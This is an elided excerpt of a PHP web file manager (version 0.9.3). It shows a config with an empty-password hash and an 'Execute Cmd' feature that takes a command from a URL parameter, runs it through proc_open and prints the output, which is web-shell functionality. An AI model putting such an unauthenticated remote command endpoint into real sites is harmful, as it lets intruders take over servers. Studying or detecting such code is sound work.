<?PHP 
//a:9:{s:4:"lang";s:2:"en";s:9:"auth_pass";s:32:"d41d8cd98f00b204e9800998ecf8427e";s:8:"quota_mb";i:0;s:17:"upload_ext_filter";a:0:{}s:19:"download_ext_filter";a:0:{}s:15:"error_reporting";s:0:"";s:7:"fm_root";s:0:"";s:17:"cookie_cache_time";i:1307441982;s:7:"version";s:5:"0.9.3";}
    ...
    switch ($frame){
        ...
        default:
            switch($action){
                ...
                case 11: execute_without_cmd(); break;
                default: frameset();
            }
    }
} else {
...
class config {
    ...
    function config(){
        ...
        $this->data = array(
            ...
            'error_reporting'=>'',
            'fm_root'=>'',
            'cookie_cache_time'=>time()+60*60*24*30,
            'version'=>'0.9.3'
            );
        $data = false;
...
function et($tag){
    ...
    $en['ExecCmd'] = 'Execute Cmd';
    $en['ExecCmdNoCmd'] = 'Execute Cmd (No cmd.exe)';
    $en['Upload'] = 'Upload';
    ...
    $en['TypeCmdNoCmd'] = 'Enter the command (Wont be using cmd.exe)';
...
function execute_without_cmd($command){
    ...
    if (strlen($cmd)){
		...
		$process = proc_open($cmd, $descriptorspec, $pipes, NULL, NULL, $other_options);
		if (is_resource($process)){
			...
			$outputfinal = $output1.$output2;
			if (count($outputfinal)) echo $outputfinal;
...
function dir_list_form() {
    ...
    if ($opdir = @opendir($dir_atual)) {
        ...
        function execute_without_cmd(){
                document.form_action.cmd_arg.value = prompt('".et('TypeCmdNoCmd').".');
                if(document.form_action.cmd_arg.value.length>0){
                    if(confirm('".et('ConfExec')." \\' '+document.form_action.cmd_arg.value+' \\' ?')) {
                        var w = 800;
                        var h = 600;
                        window.open('".$path_info["basename"]."?action=11&dir_atual=$dir_atual&cmd='+escape(document.form_action.cmd_arg.value), '', 'width='+w+',height='+h+',fullscreen=no,scrollbars=yes,resizable=yes,status=no,toolbar=no,menubar=no,location=no');
                    }
                }
        }
        ...
        $out .= "
            ...
            <input type=button onclick=\"execute_without_cmd()\" value=\"".et('ExecCmdNoCmd')."\">
